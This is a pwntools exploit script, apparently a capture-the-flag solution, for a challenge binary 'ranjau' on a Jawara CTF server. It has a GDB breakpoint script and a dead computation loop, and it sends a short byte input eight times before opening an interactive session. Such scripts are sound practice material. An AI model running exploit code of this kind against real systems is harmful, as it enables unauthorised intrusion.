#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.cyber.jawara.systems --port 13373 ./ranjau
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ranjau')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.cyber.jawara.systems'
port = int(args.PORT or 13373)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv,aslr=0, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
tbreak game
b *0x0000555555554a9b
b *0x555555554956
# b *0x555555554a7f
b *0x0000555555554bf9
b *0x5555555549e0
b *0x0000555555554c46
continue
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# y='ABCD'
# x='1234'
for i in range(255):
    for j in range(255):
        v0=(4 * (i - 65) + j - 49)
        v10 = v0;
        v2 = v0;
        if v0 < 0 :
            tem=3
        else:
            tem=0
        v1 = v0 + tem
        temp = 4 * (v1 >> 2) + v10 % 4
        if (temp == -28):
            # print temp
            pass
            # print i,j
for i in range(8):
    io.sendline("\x30\x59")
# print temp2

io.interactive()

